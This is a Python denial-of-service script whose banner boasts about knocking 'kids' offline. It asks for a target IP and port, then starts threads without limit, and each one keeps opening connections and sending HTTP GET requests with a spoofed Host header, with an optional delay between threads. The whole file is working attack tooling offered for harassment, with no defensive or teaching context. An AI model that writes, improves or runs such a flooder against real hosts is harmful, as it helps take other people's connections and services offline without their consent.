import socket
import threading
import time

print("Welcome ( ° ͜ʖ°)╭∩╮. You here to kick some kids offline?")
time.sleep(1.5)

target = input("Enter a IP: ")
time.sleep(0.75)
str_port = input("Enter port: ")
time.sleep(0.75)
port = int(str_port)
fake_ip = '10.10.192.1'

while True: 
     query = input("Do you want to run a delay between packets? ") 
     Fl = query[0].lower() 
     if query == '' or not Fl in ['y','n']: 
        print('Please answer with yes or no!') 
     else: 
        break
if Fl == 'y': 
    WaitTime = input("Enter the delay between packets: ")
    x = WaitTime.isdecimal()

    if x:
        WaitTime = int(WaitTime)
    else:
        WaitTime = float(WaitTime)
    
    def attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + "HTTP/1.1.\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()

    while True:
        thread = threading.Thread(target=attack)
        thread.start()
        time.sleep(WaitTime)
        print(thread)

    
    
if Fl == 'n': 

    def attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + "HTTP/1.1.\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()


    while True:
        thread = threading.Thread(target=attack)
        thread.start()
        print(thread)
